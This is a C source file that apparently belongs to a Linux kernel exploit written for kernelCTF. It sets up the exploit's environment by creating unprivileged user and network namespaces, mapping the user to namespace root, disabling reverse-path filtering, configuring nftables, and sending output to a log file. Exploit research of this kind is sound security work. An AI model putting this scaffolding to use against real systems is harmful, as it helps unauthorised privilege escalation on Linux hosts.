// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/types.h>
#include <ifaddrs.h>

#include "env.h"
#include "nftnl.h"
#include "file.h"

// https://stackoverflow.com/a/17997505
static void bring_interface_up(const char *ifname)
{
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);

    close(sockfd);
}

static void disable_rpf_by_ifname(const char *ifname)
{
    char rp_filter_path[PATH_MAX];

    PRINTF_VERBOSE("[*] disabling rpf for interface: '%s'\n", ifname);

    sprintf(rp_filter_path, "/proc/sys/net/ipv4/conf/%s/rp_filter", ifname);

    write_file(rp_filter_path, "0\n", 2, 0);
}

static void disable_rpf_for_all()
{
    struct ifaddrs *addrs;

    getifaddrs(&addrs);

    for (struct ifaddrs *curr = addrs; curr != NULL; curr = curr->ifa_next)
        if (curr->ifa_addr && curr->ifa_addr->sa_family == AF_PACKET)
            disable_rpf_by_ifname(curr->ifa_name);

    freeifaddrs(addrs);
}

static void configure_net_interfaces()
{
	printf("[*] configuring localhost in namespace...\n");

    // kernelctf does not have the `ip` binary
    bring_interface_up("lo");

    // assume echo is installed, and wildcards etc are supported
    // disable RPF on all interfaces in network namespace
    PRINTF_VERBOSE("[*] disabling RPF in network namespace...\n");
    disable_rpf_for_all();
	write_file("/proc/sys/net/ipv4/conf/all/rp_filter", "0\n", 2, 0);

#if CONFIG_VERBOSE_
    system("ip addr");
    system("sysctl net.ipv4.conf.all.rp_filter");
    system("sysctl net.ipv4.conf.lo.rp_filter");
#endif
}

static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
    char uid_map[128];
    char gid_map[128];

    printf("[*] setting up UID namespace...\n");
    
    sprintf(uid_map, "0 %d 1\n", old_uid); 
    sprintf(gid_map, "0 %d 1\n", old_gid);

    // write the uid/gid mappings. setgroups = "deny" to prevent permission error 
    PRINTF_VERBOSE("[*] mapping uid %d to namespace uid 0...\n", old_uid);
    write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);

    PRINTF_VERBOSE("[*] denying namespace rights to set user groups...\n");
    write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);

    PRINTF_VERBOSE("[*] mapping gid %d to namespace gid 0...\n", old_gid);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);

#if CONFIG_VERBOSE_
    // perform sanity check
    // debug-only since it may be confusing for users
	system("id");
#endif
}

static void do_unshare()
{
    int retv;

    printf("[*] creating user namespace (CLONE_NEWUSER)...\n");
    
	// do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    printf("[*] creating network namespace (CLONE_NEWNET)...\n");

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
	{
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
}

void setup_env()
{
    uid_t uid = getuid();
    gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
	configure_net_interfaces();
	configure_nftables();
}

void setup_log(const char *filename)
{
	int log_fd;

	printf("[*] piping stdout and stderr to file '%s'...\n", filename);
	printf("[*] - caution! this means that exploit is not fileless\n");

	log_fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_APPEND, 0755);
	if (log_fd < 0)
	{
		printf("[!] failed to open log for writing\n");
		exit(EXIT_FAILURE);
	}

	dup2(log_fd, STDOUT_FILENO);
	dup2(log_fd, STDERR_FILENO);
}